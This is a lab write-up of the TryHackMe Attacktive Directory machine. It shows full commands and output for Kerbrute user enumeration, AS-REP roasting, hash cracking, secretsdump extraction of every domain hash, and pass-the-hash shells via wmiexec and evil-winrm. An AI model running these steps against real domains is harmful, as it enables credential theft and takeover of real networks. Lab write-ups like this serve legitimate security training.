---
title: Attacktive Directory (TryHackMe Writeup)
date: 2023-05-30
categories: [Writeups, THM]
tags: [Active Directory, SMB, Kerbrute, AS-REP Roast]
---

![](/assets/img/AttacktiveDirectory/1.png)

Hi everyone! Today we're going to be solving the `AttacktiveDirectory` machine from `TryHackMe`. As the name says, this machine is about `AD` (and I love AD :D)
Contents:

- Enumeration with `nmap`
- SMB Enumeration
- Kerbrute
- AS-REP Roast
- Extracting hashes with `secretsdump`

## Enumeration

- - -

### Nmap

- - -

In **evey** machine we start by enumerating the opened ports of the machine:

```zsh
❯ nmap -p- -sS --open --min-rate 5000 -vvv -Pn -n 10.10.128.202 -oG allPorts
Host discovery disabled (-Pn). All addresses will be marked 'up' and scan times may be slower.
Starting Nmap 7.93 ( https://nmap.org ) at 2023-05-30 15:57 CEST
Initiating SYN Stealth Scan at 15:57
Scanning 10.10.128.202 [65535 ports]
Discovered open port 3389/tcp on 10.10.128.202
Discovered open port 139/tcp on 10.10.128.202
Discovered open port 135/tcp on 10.10.128.202
Discovered open port 53/tcp on 10.10.128.202
Discovered open port 80/tcp on 10.10.128.202
Discovered open port 445/tcp on 10.10.128.202
Discovered open port 47001/tcp on 10.10.128.202
Discovered open port 88/tcp on 10.10.128.202
Discovered open port 3269/tcp on 10.10.128.202
Discovered open port 49665/tcp on 10.10.128.202
Discovered open port 49664/tcp on 10.10.128.202
Discovered open port 49668/tcp on 10.10.128.202
Discovered open port 49679/tcp on 10.10.128.202
Discovered open port 49690/tcp on 10.10.128.202
Discovered open port 49822/tcp on 10.10.128.202
Discovered open port 49669/tcp on 10.10.128.202
Discovered open port 464/tcp on 10.10.128.202
Discovered open port 9389/tcp on 10.10.128.202
Discovered open port 3268/tcp on 10.10.128.202
Discovered open port 49672/tcp on 10.10.128.202
Discovered open port 49666/tcp on 10.10.128.202
Discovered open port 389/tcp on 10.10.128.202
Discovered open port 49670/tcp on 10.10.128.202
Discovered open port 636/tcp on 10.10.128.202
Increasing send delay for 10.10.128.202 from 0 to 5 due to max_successful_tryno increase to 4
Completed SYN Stealth Scan at 15:57, 33.10s elapsed (65535 total ports)
Nmap scan report for 10.10.128.202
Host is up, received user-set (0.071s latency).
Scanned at 2023-05-30 15:57:24 CEST for 33s
Not shown: 63282 closed tcp ports (reset), 2229 filtered tcp ports (no-response)
Some closed ports may be reported as filtered due to --defeat-rst-ratelimit
PORT      STATE SERVICE          REASON
53/tcp    open  domain           syn-ack ttl 127
80/tcp    open  http             syn-ack ttl 127
88/tcp    open  kerberos-sec     syn-ack ttl 127
135/tcp   open  msrpc            syn-ack ttl 127
139/tcp   open  netbios-ssn      syn-ack ttl 127
389/tcp   open  ldap             syn-ack ttl 127
445/tcp   open  microsoft-ds     syn-ack ttl 127
464/tcp   open  kpasswd5         syn-ack ttl 127
636/tcp   open  ldapssl          syn-ack ttl 127
3268/tcp  open  globalcatLDAP    syn-ack ttl 127
3269/tcp  open  globalcatLDAPssl syn-ack ttl 127
3389/tcp  open  ms-wbt-server    syn-ack ttl 127
9389/tcp  open  adws             syn-ack ttl 127
47001/tcp open  winrm            syn-ack ttl 127
49664/tcp open  unknown          syn-ack ttl 127
49665/tcp open  unknown          syn-ack ttl 127
49666/tcp open  unknown          syn-ack ttl 127
49668/tcp open  unknown          syn-ack ttl 127
49669/tcp open  unknown          syn-ack ttl 127
49670/tcp open  unknown          syn-ack ttl 127
49672/tcp open  unknown          syn-ack ttl 127
49679/tcp open  unknown          syn-ack ttl 127
49690/tcp open  unknown          syn-ack ttl 127
49822/tcp open  unknown          syn-ack ttl 127

Read data files from: /usr/bin/../share/nmap
Nmap done: 1 IP address (1 host up) scanned in 33.30 seconds
           Raw packets sent: 164761 (7.249MB) | Rcvd: 66243 (2.650MB)
```

After that, we can pass the file to our custom function `extractPorts`:

```bash
❯ which extractPorts
extractPorts () {
	ports="$(cat $1 | grep -oP '\d{1,5}/open' | awk '{print $1}' FS='/' | xargs | tr ' ' ',')" 
	ip_address="$(cat $1 | grep -oP '\d{1,3}\.\d{1,3}\.\d{1,3}\.\d{1,3}' | sort -u | head -n 1)" 
	echo -e "\n[*] Extracting information...\n" > extractPorts.tmp
	echo -e "\t[*] IP Address: $ip_address" >> extractPorts.tmp
	echo -e "\t[*] Open ports: $ports\n" >> extractPorts.tmp
	echo $ports | tr -d '\n' | xclip -sel clip
	echo -e "[*] Ports copied to clipboard\n" >> extractPorts.tmp
	batcat extractPorts.tmp
	rm extractPorts.tmp
}
```

Now, let's indicate the file to the tool:

```zsh
❯ extractPorts allPorts

    [*] Extracting information...

        [*] IP Address: 10.10.128.202
        [*] Open ports: 53,80,88,135,139,389,445,464,636,3268,3269,3389,9389,47001,49664,49665,49666,49668,49669,49670,49672,49679,49690,49822

    [*] Ports copied to clipboard
```

After that we can perform a **deeper** scan of those ports:

```zsh
❯ nmap -sCV -p53,80,88,135,139,389,445,464,636,3268,3269,3389,9389,47001,49664,49665,49666,49668,49669,49670,49672,49679,49690,49822 10.10.128.202 -oN targeted
Starting Nmap 7.93 ( https://nmap.org ) at 2023-05-30 16:00 CEST
Nmap scan report for 10.10.128.202
Host is up (0.11s latency).

PORT      STATE SERVICE       VERSION
53/tcp    open  domain        Simple DNS Plus
80/tcp    open  http          Microsoft IIS httpd 10.0
|_http-server-header: Microsoft-IIS/10.0
|_http-title: IIS Windows Server
| http-methods: 
|_  Potentially risky methods: TRACE
88/tcp    open  kerberos-sec  Microsoft Windows Kerberos (server time: 2023-05-30 14:00:41Z)
135/tcp   open  msrpc         Microsoft Windows RPC
139/tcp   open  netbios-ssn   Microsoft Windows netbios-ssn
389/tcp   open  ldap          Microsoft Windows Active Directory LDAP (Domain: spookysec.local0., Site: Default-First-Site-Name)
445/tcp   open  microsoft-ds?
464/tcp   open  kpasswd5?
636/tcp   open  tcpwrapped
3268/tcp  open  ldap          Microsoft Windows Active Directory LDAP (Domain: spookysec.local0., Site: Default-First-Site-Name)
3269/tcp  open  tcpwrapped
3389/tcp  open  ms-wbt-server Microsoft Terminal Services
| ssl-cert: Subject: commonName=AttacktiveDirectory.spookysec.local
| Not valid before: 2023-05-29T13:50:35
|_Not valid after:  2023-11-28T13:50:35
|_ssl-date: 2023-05-30T14:01:44+00:00; +2s from scanner time.
| rdp-ntlm-info: 
|   Target_Name: THM-AD
|   NetBIOS_Domain_Name: THM-AD
|   NetBIOS_Computer_Name: ATTACKTIVEDIREC
|   DNS_Domain_Name: spookysec.local
|   DNS_Computer_Name: AttacktiveDirectory.spookysec.local
|   Product_Version: 10.0.17763
|_  System_Time: 2023-05-30T14:01:37+00:00
9389/tcp  open  mc-nmf        .NET Message Framing
47001/tcp open  http          Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
|_http-server-header: Microsoft-HTTPAPI/2.0
|_http-title: Not Found
49664/tcp open  msrpc         Microsoft Windows RPC
49665/tcp open  msrpc         Microsoft Windows RPC
49666/tcp open  msrpc         Microsoft Windows RPC
49668/tcp open  msrpc         Microsoft Windows RPC
49669/tcp open  ncacn_http    Microsoft Windows RPC over HTTP 1.0
49670/tcp open  msrpc         Microsoft Windows RPC
49672/tcp open  msrpc         Microsoft Windows RPC
49679/tcp open  msrpc         Microsoft Windows RPC
49690/tcp open  msrpc         Microsoft Windows RPC
49822/tcp open  msrpc         Microsoft Windows RPC
Service Info: Host: ATTACKTIVEDIREC; OS: Windows; CPE: cpe:/o:microsoft:windows

Host script results:
| smb2-time: 
|   date: 2023-05-30T14:01:37
|_  start_date: N/A
|_clock-skew: mean: 2s, deviation: 0s, median: 1s
| smb2-security-mode: 
|   311: 
|_    Message signing enabled and required

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 73.34 seconds
```

### CrackMapExec

- - -

Because this is an AD machine, we can perform enumeration of shares and other things with `crackmapexec`:

```zsh
❯ cme smb 10.10.128.202
SMB         10.10.128.202   445    ATTACKTIVEDIREC  [*] Windows 10.0 Build 17763 x64 (name:ATTACKTIVEDIREC) (domain:spookysec.local) (signing:True) (SMBv1:False)
```

Here we can see the domain `spookysec.local`, so let's add it into our `/etc/hosts` file. Now we can check if everything is correct by pinging the domain:

```zsh
❯ ping -c 1 spookysec.local
PING spookysec.local (10.10.128.202) 56(84) bytes of data.
64 bytes from spookysec.local (10.10.128.202): icmp_seq=1 ttl=127 time=115 ms

--- spookysec.local ping statistics ---
1 packets transmitted, 1 received, 0% packet loss, time 0ms
rtt min/avg/max/mdev = 115.075/115.075/115.075/0.000 ms
```

Perfect! Everything is OK.

Now I was trying to get the usernames, so we could later perform an `AS-REP Roast` attack, but I didn't managed to find them via `rpcclient`:

```zsh
❯ rpcclient -U "" 10.10.128.202 -N
rpcclient $> enumdomusers
result was NT_STATUS_ACCESS_DENIED
rpcclient $> 
```

As we can see, we get an `AccessDenied` error, so that means that the `null session` is disabled on this DC.
After searching for username lists, I've found [this one](https://github.com/Sq00ky/attacktive-directory-tools/blob/master/userlist.txt). We can save this list into a file called `allUsers`. After that, we'll perform an attack with `Kerbrute` so we can see the system-valid usernames:

```zsh
❯ ./kerbrute userenum allUsers --dc dc.spookysec.local -d spookysec.local

    __             __               __     
   / /_____  _____/ /_  _______  __/ /____ 
  / //_/ _ \/ ___/ __ \/ ___/ / / / __/ _ \
 / ,< /  __/ /  / /_/ / /  / /_/ / /_/  __/
/_/|_|\___/_/  /_.___/_/   \__,_/\__/\___/                                        

Version: v1.0.3 (9dad6e1) - 05/30/23 - Ronnie Flathers @ropnop

2023/05/30 16:11:18 >  Using KDC(s):
2023/05/30 16:11:18 >  	dc.spookysec.local:88

2023/05/30 16:11:19 >  [+] VALID USERNAME:	james@spookysec.local
2023/05/30 16:11:20 >  [+] VALID USERNAME:	svc-admin@spookysec.local
2023/05/30 16:11:22 >  [+] VALID USERNAME:	James@spookysec.local
2023/05/30 16:11:23 >  [+] VALID USERNAME:	robin@spookysec.local
2023/05/30 16:11:30 >  [+] VALID USERNAME:	darkstar@spookysec.local
2023/05/30 16:11:40 >  [+] VALID USERNAME:	administrator@spookysec.local
2023/05/30 16:11:49 >  [+] VALID USERNAME:	backup@spookysec.local
2023/05/30 16:11:53 >  [+] VALID USERNAME:	paradox@spookysec.local
2023/05/30 16:12:20 >  [+] VALID USERNAME:	JAMES@spookysec.local
2023/05/30 16:12:32 >  [+] VALID USERNAME:	Robin@spookysec.local
2023/05/30 16:14:00 >  [+] VALID USERNAME:	Administrator@spookysec.local
2023/05/30 16:15:59 >  [+] VALID USERNAME:	Darkstar@spookysec.local
2023/05/30 16:16:35 >  [+] VALID USERNAME:	Paradox@spookysec.local
```

Ohhh nice!! We have system-valid usernames!! Let's save this usernames into a file called `users`.

## AS-REP Roast

- - -

The AS-REP Roast attack consists on a request (AS-REQ) that we send with a list of users and we receive a request (AS-REP) message. This message contains a hash of users that have `Do Not Require Kerberos Pre-Auth` enabled.

We can perform this attack with the `impacket` tool: `GetNPUsers.py`:

```zsh
❯ impacket-GetNPUsers spookysec.local/ -no-pass -usersfile users
Impacket v0.10.0 - Copyright 2022 SecureAuth Corporation

[-] User james doesn't have UF_DONT_REQUIRE_PREAUTH set
$krb5asrep$23$svc-admin@SPOOKYSEC.LOCAL:3e824fdf445fce1adf009c5c817ca6b0$8dcdc8d2dc9398fbb96c2669fc5a634a480731bcc0443fa4d4954d1dfafadef9c05858fc2632aa92ccf642526068cc5f426826b974d92f97a4acd27277cb38d58f10b3f8df932f33a2627bbf79a451cafd0cc4bbc7209fe19763f3cdf5ec7e333c41131b722e567ed5dc5b411807b7809929c8096a9ee071866ba75d787ea3b3fb06bb5ef9d0bd1e7fb8a72b0884da4faa791187fb71a39200670654e5b7df64dee1b245aaf458c5f3ca8742ca6270086aa2c46e686f2181115cd0e17e47bbdfded6239b005dadd7fb26ed1976626ae09e944711c97ee11b5c4c1ed97df08a3e202f0a1b8b70273d9eb3daa743b48d261924
[-] User robin doesn't have UF_DONT_REQUIRE_PREAUTH set
[-] User darkstar doesn't have UF_DONT_REQUIRE_PREAUTH set
[-] User administrator doesn't have UF_DONT_REQUIRE_PREAUTH set
[-] User backup doesn't have UF_DONT_REQUIRE_PREAUTH set
[-] User paradox doesn't have UF_DONT_REQUIRE_PREAUTH set
```

Ok! Great! So `svc_admin` was vulnerable to this type of attack. Now, with this hash in our possession, we can try to crack it with `john`:

```zsh
❯ john -w:/usr/share/wordlists/rockyou.txt hash
Using default input encoding: UTF-8
Loaded 1 password hash (krb5asrep, Kerberos 5 AS-REP etype 17/18/23 [MD4 HMAC-MD5 RC4 / PBKDF2 HMAC-SHA1 AES 256/256 AVX2 8x])
Will run 4 OpenMP threads
Press 'q' or Ctrl-C to abort, almost any other key for status
management2005   ($krb5asrep$23$svc-admin@SPOOKYSEC.LOCAL)     
1g 0:00:00:09 DONE (2023-05-30 16:29) 0.1025g/s 598751p/s 598751c/s 598751C/s manaia05..man3333
Use the "--show" option to display all of the cracked passwords reliably
Session completed. 
```

Great!!! So with these credentials on our possession, we can back to `crackmapexec` enumeration:

```zsh
❯ cme smb 10.10.128.202 -u svc-admin -p management2005 --shares
SMB         10.10.128.202   445    ATTACKTIVEDIREC  [*] Windows 10.0 Build 17763 x64 (name:ATTACKTIVEDIREC) (domain:spookysec.local) (signing:True) (SMBv1:False)
SMB         10.10.128.202   445    ATTACKTIVEDIREC  [+] spookysec.local\svc-admin:management2005 
SMB         10.10.128.202   445    ATTACKTIVEDIREC  [+] Enumerated shares
SMB         10.10.128.202   445    ATTACKTIVEDIREC  Share           Permissions     Remark
SMB         10.10.128.202   445    ATTACKTIVEDIREC  -----           -----------     ------
SMB         10.10.128.202   445    ATTACKTIVEDIREC  ADMIN$                          Remote Admin
SMB         10.10.128.202   445    ATTACKTIVEDIREC  backup          READ            
SMB         10.10.128.202   445    ATTACKTIVEDIREC  C$                              Default share
SMB         10.10.128.202   445    ATTACKTIVEDIREC  IPC$            READ            Remote IPC
SMB         10.10.128.202   445    ATTACKTIVEDIREC  NETLOGON        READ            Logon server share 
SMB         10.10.128.202   445    ATTACKTIVEDIREC  SYSVOL          READ            Logon server share 
```

Hm, interesting. So here we can see that we have `READ` permissions on the `backup` share, which seems pretty interesting. We can connect with `impacket-smbclient` to see its content:

```zsh
❯ impacket-smbclient spookysec.local/svc-admin:management2005@10.10.128.202
Impacket v0.10.0 - Copyright 2022 SecureAuth Corporation

Type help for list of commands
# ls
[-] No share selected
# use backup
# ls
drw-rw-rw-          0  Sat Apr  4 21:08:39 2020 .
drw-rw-rw-          0  Sat Apr  4 21:08:39 2020 ..
-rw-rw-rw-         48  Sat Apr  4 21:08:53 2020 backup_credentials.txt
# get backup_credentials.txt
# exit
```

All right! So let's download this file and let's see its content:

```zsh
❯ ls
allUsers  backup_credentials.txt  hash  kerbrute  users

❯ cat backup_credentials.txt
YmFja3VwQHNwb29reXNlYy5sb2NhbDpiYWNrdXAyNTE3ODYw
```

Ok, so it seems to be a `base64` encoded string, so let's decode it!

```zsh
❯ cat backup_credentials.txt | base64 -d
backup@spookysec.local:backup2517860
```

## Bloodhound

- - -

Nice! Now that we have these credentials we can run [bloodhound](https://github.com/fox-it/BloodHound.py) to see all the info more clearly:

```zsh
❯ python3 bloodhound.py -u backup -p 'backup2517860' -d spookysec.local -ns 10.10.128.202 -c all --zip
INFO: Found AD domain: spookysec.local
INFO: Getting TGT for user
INFO: Connecting to LDAP server: attacktivedirectory.spookysec.local
INFO: Kerberos auth to LDAP failed, trying NTLM
INFO: Found 1 domains
INFO: Found 1 domains in the forest
INFO: Found 1 computers
INFO: Connecting to LDAP server: attacktivedirectory.spookysec.local
INFO: Kerberos auth to LDAP failed, trying NTLM
INFO: Found 18 users
INFO: Found 54 groups
INFO: Found 2 gpos
INFO: Found 3 ous
INFO: Found 21 containers
INFO: Found 0 trusts
INFO: Starting computer enumeration with 10 workers
INFO: Querying computer: AttacktiveDirectory.spookysec.local
WARNING: Failed to get service ticket for AttacktiveDirectory.spookysec.local, falling back to NTLM auth
CRITICAL: CCache file is not found. Skipping...
WARNING: DCE/RPC connection failed: [Errno Connection error (attacktivedirectory.spookysec.local:88)] [Errno -2] Name or service not known
INFO: Ignoring host AttacktiveDirectory.spookysec.local since its reported name ATTACKTIVEDIREC does not match
INFO: Done in 00M 16S
INFO: Compressing output into 20230530164456_bloodhound.zip
```

Perfect! Now let's fire up `neo4j` and `bloodhound` and then see all info on the last tool:

![](/assets/img/AttacktiveDirectory/2.png)

## Secretsdump

- - -

With this privilege over `backup` user, should be enough to dump the `NT` hashes of all users:

```zsh
❯ impacket-secretsdump spookysec.local/backup:backup2517860@10.10.128.202
Impacket v0.10.0 - Copyright 2022 SecureAuth Corporation

[-] RemoteOperations failed: DCERPC Runtime Error: code: 0x5 - rpc_s_access_denied 
[*] Dumping Domain Credentials (domain\uid:rid:lmhash:nthash)
[*] Using the DRSUAPI method to get NTDS.DIT secrets
Administrator:500:aad3b435b51404eeaad3b435b51404ee:0e0363213e37b94221497260b0bcb4fc:::
Guest:501:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
krbtgt:502:aad3b435b51404eeaad3b435b51404ee:0e2eb8158c27bed09861033026be4c21:::
spookysec.local\skidy:1103:aad3b435b51404eeaad3b435b51404ee:5fe9353d4b96cc410b62cb7e11c57ba4:::
spookysec.local\breakerofthings:1104:aad3b435b51404eeaad3b435b51404ee:5fe9353d4b96cc410b62cb7e11c57ba4:::
spookysec.local\james:1105:aad3b435b51404eeaad3b435b51404ee:9448bf6aba63d154eb0c665071067b6b:::
spookysec.local\optional:1106:aad3b435b51404eeaad3b435b51404ee:436007d1c1550eaf41803f1272656c9e:::
spookysec.local\sherlocksec:1107:aad3b435b51404eeaad3b435b51404ee:b09d48380e99e9965416f0d7096b703b:::
spookysec.local\darkstar:1108:aad3b435b51404eeaad3b435b51404ee:cfd70af882d53d758a1612af78a646b7:::
spookysec.local\Ori:1109:aad3b435b51404eeaad3b435b51404ee:c930ba49f999305d9c00a8745433d62a:::
spookysec.local\robin:1110:aad3b435b51404eeaad3b435b51404ee:642744a46b9d4f6dff8942d23626e5bb:::
spookysec.local\paradox:1111:aad3b435b51404eeaad3b435b51404ee:048052193cfa6ea46b5a302319c0cff2:::
spookysec.local\Muirland:1112:aad3b435b51404eeaad3b435b51404ee:3db8b1419ae75a418b3aa12b8c0fb705:::
spookysec.local\horshark:1113:aad3b435b51404eeaad3b435b51404ee:41317db6bd1fb8c21c2fd2b675238664:::
spookysec.local\svc-admin:1114:aad3b435b51404eeaad3b435b51404ee:fc0f1e5359e372aa1f69147375ba6809:::
spookysec.local\backup:1118:aad3b435b51404eeaad3b435b51404ee:19741bde08e135f4b40f1ca9aab45538:::
spookysec.local\a-spooks:1601:aad3b435b51404eeaad3b435b51404ee:0e0363213e37b94221497260b0bcb4fc:::
ATTACKTIVEDIREC$:1000:aad3b435b51404eeaad3b435b51404ee:0bf31d7054b52845b517504a3f43006a:::
[*] Kerberos keys grabbed
Administrator:aes256-cts-hmac-sha1-96:713955f08a8654fb8f70afe0e24bb50eed14e53c8b2274c0c701ad2948ee0f48
Administrator:aes128-cts-hmac-sha1-96:e9077719bc770aff5d8bfc2d54d226ae
Administrator:des-cbc-md5:2079ce0e5df189ad
krbtgt:aes256-cts-hmac-sha1-96:b52e11789ed6709423fd7276148cfed7dea6f189f3234ed0732725cd77f45afc
krbtgt:aes128-cts-hmac-sha1-96:e7301235ae62dd8884d9b890f38e3902
krbtgt:des-cbc-md5:b94f97e97fabbf5d
spookysec.local\skidy:aes256-cts-hmac-sha1-96:3ad697673edca12a01d5237f0bee628460f1e1c348469eba2c4a530ceb432b04
spookysec.local\skidy:aes128-cts-hmac-sha1-96:484d875e30a678b56856b0fef09e1233
spookysec.local\skidy:des-cbc-md5:b092a73e3d256b1f
spookysec.local\breakerofthings:aes256-cts-hmac-sha1-96:4c8a03aa7b52505aeef79cecd3cfd69082fb7eda429045e950e5783eb8be51e5
spookysec.local\breakerofthings:aes128-cts-hmac-sha1-96:38a1f7262634601d2df08b3a004da425
spookysec.local\breakerofthings:des-cbc-md5:7a976bbfab86b064
spookysec.local\james:aes256-cts-hmac-sha1-96:1bb2c7fdbecc9d33f303050d77b6bff0e74d0184b5acbd563c63c102da389112
spookysec.local\james:aes128-cts-hmac-sha1-96:08fea47e79d2b085dae0e95f86c763e6
spookysec.local\james:des-cbc-md5:dc971f4a91dce5e9
spookysec.local\optional:aes256-cts-hmac-sha1-96:fe0553c1f1fc93f90630b6e27e188522b08469dec913766ca5e16327f9a3ddfe
spookysec.local\optional:aes128-cts-hmac-sha1-96:02f4a47a426ba0dc8867b74e90c8d510
spookysec.local\optional:des-cbc-md5:8c6e2a8a615bd054
spookysec.local\sherlocksec:aes256-cts-hmac-sha1-96:80df417629b0ad286b94cadad65a5589c8caf948c1ba42c659bafb8f384cdecd
spookysec.local\sherlocksec:aes128-cts-hmac-sha1-96:c3db61690554a077946ecdabc7b4be0e
spookysec.local\sherlocksec:des-cbc-md5:08dca4cbbc3bb594
spookysec.local\darkstar:aes256-cts-hmac-sha1-96:35c78605606a6d63a40ea4779f15dbbf6d406cb218b2a57b70063c9fa7050499
spookysec.local\darkstar:aes128-cts-hmac-sha1-96:461b7d2356eee84b211767941dc893be
spookysec.local\darkstar:des-cbc-md5:758af4d061381cea
spookysec.local\Ori:aes256-cts-hmac-sha1-96:5534c1b0f98d82219ee4c1cc63cfd73a9416f5f6acfb88bc2bf2e54e94667067
spookysec.local\Ori:aes128-cts-hmac-sha1-96:5ee50856b24d48fddfc9da965737a25e
spookysec.local\Ori:des-cbc-md5:1c8f79864654cd4a
spookysec.local\robin:aes256-cts-hmac-sha1-96:8776bd64fcfcf3800df2f958d144ef72473bd89e310d7a6574f4635ff64b40a3
spookysec.local\robin:aes128-cts-hmac-sha1-96:733bf907e518d2334437eacb9e4033c8
spookysec.local\robin:des-cbc-md5:89a7c2fe7a5b9d64
spookysec.local\paradox:aes256-cts-hmac-sha1-96:64ff474f12aae00c596c1dce0cfc9584358d13fba827081afa7ae2225a5eb9a0
spookysec.local\paradox:aes128-cts-hmac-sha1-96:f09a5214e38285327bb9a7fed1db56b8
spookysec.local\paradox:des-cbc-md5:83988983f8b34019
spookysec.local\Muirland:aes256-cts-hmac-sha1-96:81db9a8a29221c5be13333559a554389e16a80382f1bab51247b95b58b370347
spookysec.local\Muirland:aes128-cts-hmac-sha1-96:2846fc7ba29b36ff6401781bc90e1aaa
spookysec.local\Muirland:des-cbc-md5:cb8a4a3431648c86
spookysec.local\horshark:aes256-cts-hmac-sha1-96:891e3ae9c420659cafb5a6237120b50f26481b6838b3efa6a171ae84dd11c166
spookysec.local\horshark:aes128-cts-hmac-sha1-96:c6f6248b932ffd75103677a15873837c
spookysec.local\horshark:des-cbc-md5:a823497a7f4c0157
spookysec.local\svc-admin:aes256-cts-hmac-sha1-96:effa9b7dd43e1e58db9ac68a4397822b5e68f8d29647911df20b626d82863518
spookysec.local\svc-admin:aes128-cts-hmac-sha1-96:aed45e45fda7e02e0b9b0ae87030b3ff
spookysec.local\svc-admin:des-cbc-md5:2c4543ef4646ea0d
spookysec.local\backup:aes256-cts-hmac-sha1-96:23566872a9951102d116224ea4ac8943483bf0efd74d61fda15d104829412922
spookysec.local\backup:aes128-cts-hmac-sha1-96:843ddb2aec9b7c1c5c0bf971c836d197
spookysec.local\backup:des-cbc-md5:d601e9469b2f6d89
spookysec.local\a-spooks:aes256-cts-hmac-sha1-96:cfd00f7ebd5ec38a5921a408834886f40a1f40cda656f38c93477fb4f6bd1242
spookysec.local\a-spooks:aes128-cts-hmac-sha1-96:31d65c2f73fb142ddc60e0f3843e2f68
spookysec.local\a-spooks:des-cbc-md5:e09e4683ef4a4ce9
ATTACKTIVEDIREC$:aes256-cts-hmac-sha1-96:940809a7ef7eea6a2cee204215f64db44f858c91498c925aba8538d05da88cbd
ATTACKTIVEDIREC$:aes128-cts-hmac-sha1-96:d5557947610c7386479ea2a67243d8fa
ATTACKTIVEDIREC$:des-cbc-md5:ef766eea733d975d
[*] Cleaning up... 
```

![](/assets/img/AD/damn.gif)

## Pass The Hash

- - -

NICE!! With this hashes on our possession, we can simply perform a `Pass The Hash` attack to access the DC as Administrator, **OR**, we could access the DC via `evil-winrm`.

### Wmiexec.py

- - -

This is pretty simple to use:

```zsh
❯ wmiexec.py spookysec.local/Administrator@10.10.128.202 -hashes aad3b435b51404eeaad3b435b51404ee:0e0363213e37b94221497260b0bcb4fc
Impacket v0.10.0 - Copyright 2022 SecureAuth Corporation

[*] SMBv3.0 dialect used
[!] Launching semi-interactive shell - Careful what you execute
[!] Press help for extra shell commands
C:\>whoami
thm-ad\administrator

C:\>
```

You only need to specify the domain, the username, the IP of the DC, and the NT hash.

### Evil-WinRM

- - -

This is even easyer than `wmiexec.py`!!

```zsh
❯ evil-winrm -i spookysec.local -u Administrator -H 0e0363213e37b94221497260b0bcb4fc

Evil-WinRM shell v3.4

Warning: Remote path completions is disabled due to ruby limitation: quoting_detection_proc() function is unimplemented on this machine

Data: For more information, check Evil-WinRM Github: https://github.com/Hackplayers/evil-winrm#Remote-path-completion

Info: Establishing connection to remote endpoint

*Evil-WinRM* PS C:\Users\Administrator\Documents> whoami
thm-ad\administrator
*Evil-WinRM* PS C:\Users\Administrator\Documents> 
```

You only need to specify the domain (-i), the username (-u) and the hash (-H).

## Extra

- - -

We have pwned the whole DC, but we can do something else. We can see that `Administrator` has permissions to access the machine via `RDP`, so we can connect to the machine with a `GUI`!
First, we'll need to change the password to a new one that is easy to remember:

```zsh
*Evil-WinRM* PS C:\Users\Administrator\Documents> net user Administrator Password1
The command completed successfully.

*Evil-WinRM* PS C:\Users\Administrator\Documents> 
```

Now, let's connect with `xfreerdp` and we'll obtain a graphical interface as the DC's Administrator!!

![](/assets/img/AttacktiveDirectory/3.png)

Nice! Now we could do **whatever we want** on the DC!!!

## Conclusions

- - -

This kind of Active Directory machines are pretty cool if you are starting, so I recommend a lot that you try to pwn them by yourself!